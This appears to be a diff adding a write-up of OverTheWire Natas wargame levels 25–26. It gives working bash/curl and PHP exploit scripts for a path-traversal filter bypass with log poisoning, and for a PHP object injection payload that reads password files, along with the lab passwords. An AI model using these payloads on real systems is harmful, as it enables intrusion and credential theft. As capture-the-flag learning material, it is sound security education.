+Level 25 Password = "GHF6X7YwACaYYssHVY05cFq83hRktl4c"
+
+The web page has a "view sourcecode" link which code analysis shows two possible avenues for exploit: (1) ``safeinclude()``'ing a file with the translated contents of the web page; (2) ``logRequest()`` writing to a log file.
+
+For (1), ``safeinclude()``'s replacement of "../" is easily bypassed by including "..././" wherever you want "../". The second check for "natas_webpass" is not easily bypassed and your humble pentester failed to get by that check. If we had then the second avenue would not be needed.
+ 
+However, (2) allows us to write to a log file whose name and contents are partly under our control. ``curl --cookie "PHPSESSID=ohoh" ...`` can set the log filename to */tmp/natas25_ohoh.log*. ``curl  --user-agent "$phpcode" ...`` can log php code to display */etc/natas_webpass/natas26*.
+ 
+Combining both these exploits with a little bit of trial & error, we set the language to "..././..././..././..././..././tmp/natas25_ohoh.log". Becasue of this, ``safeinclude()`` will generate a log file */tmp/natas25_ohoh.log* when changing the "..././" to "../". And that file will display */etc/natas_webpass/natas26* because we set upt the user-agent to include that code, revealing the password.
+ 
+Here's the code for the exploit:
+
+
+.. code-block:: bash
+
+   #!/usr/bin/env bash
+
+   phpcode='<? echo file_get_contents("/etc/natas_webpass/natas26"); ?>'
+   phpfile='ohoh'
+   # web root directory is /var/www/natas/natas25 so /tmp is 5 ../ up
+   logfile='..././..././..././..././..././tmp/natas25_ohoh.log'
+
+   curlout=$( \
+   curl --silent \
+        --cookie "PHPSESSID=$phpfile" \
+        --user-agent "$phpcode" \
+        --form lang="$logfile" \
+        --user natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c \
+        http://natas25.natas.labs.overthewire.org/ 2>&1 \
+   )
+
+   password=${curlout#*??::??:??] }
+   password=${password%%? *}
+   echo "password=$password"
+
+And here is the result of running the script:
+
+.. code-block:: console
+
+   me@myhost:~/Natas$ ./natas25.sh
+   password=oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
+
+
+
+`Natas Level 26 -> 27 <http://natas26.natas.labs.overthewire.org/>`_
+====================================================================
+
+Level 26 Password = "oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T"
+
+The web page has a "view sourcecode" link which code analysis shows an example of `PHP Object Injection <https://www.owasp.org/index.php/PHP_Object_Injection>`_. It starts with an unused ``Logger`` class with magic ``__destruct()`` routine that is called when an instance is destroyed after being ``unserialize()``'ed. And that ``unserialize()`` can come from ``$drawing=unserialize(base64_decode($_COOKIE["drawing"]));`` which is supposed to be a "drawing" but will be a ``Logger`` instance. That serialized logger instance can be defined to create a log file *img/hackinto.php* with ``exitMsg`` set to write ``echo file_get_contents("/etc/natas_webpass/natas27");`` to the log file. Then you only have to open `img/hackinto.php <http://natas26.natas.labs.overthewire.org/img/hackinto.php>`_ to read the password.
+
+Our first task is to serialize the ``Logger`` object. We just need the local variables set properly in the ``_construct()`` method. The class name and the variables are what gets serialized, not the methods nor their signatures. Here is the serialization for ``Logger``. Note that even though the ``Logger`` class seems to force a ``logFile`` extension of ".log" the serialized version has ".php". Here is *natas26.php*:
+
+
+.. code-block:: php
+
+   <?php
+
+   class Logger{
+       private $logFile;
+       private $initMsg;
+       private $exitMsg;
+         
+       function __construct(){
+           // initialise variables
+           $this->initMsg="";
+           $this->exitMsg="<? echo file_get_contents('/etc/natas_webpass/natas27'); ?>";
+           $this->logFile = $GLOBALS['file'];
+       }                       
+         
+   }
+
+   $file = $argv[1];
+   echo "serialized=" . base64_encode(serialize(new Logger()));
+
+   ?>
+
+Here is *natas26.sh*, the script to run the php file above, make the initial request with the serialized ``Logger()`` object (and create the "log" .php file), and the final request for the the "log" .php file.
+
+.. code-block:: bash
+
+   #!/usr/bin/env bash
+
+   FILE=img/hackinto.php
+
+   phpout=$(php natas26.php $FILE)
+   serialized=${phpout#*serialized=}
+   serialized=${serialized%%
+   *}
+   echo "serialized=$serialized"
+
+   curlout=$( \
+   curl --silent \
+        --cookie "drawing=$serialized" \
+        --user natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T \
+        http://natas26.natas.labs.overthewire.org/ 2>&1 \
+   )
+
+   curlout=$( \
+   curl --silent \
+        --user natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T \
+        http://natas26.natas.labs.overthewire.org/$FILE 2>&1 \
+   )
+
+   echo "password=$curlout"
+
+
+Here's the exploit results.
+
+.. code-block:: console
+
+   me@myhost:~/Natas$ ./natas26.sh
+   serialized=Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNjoiaW1nL2hhY2tpbnRvLnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjA6IiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjU5OiI8PyBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCcvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PiI7fQ==
+   password=55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
+
+
+`Natas Level 27 <http://natas27.natas.labs.overthewire.org/>`_
+===============================================================
+
+Level 27 Password = "55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ"
+
+"Congratulations! You have reached the end... for now."
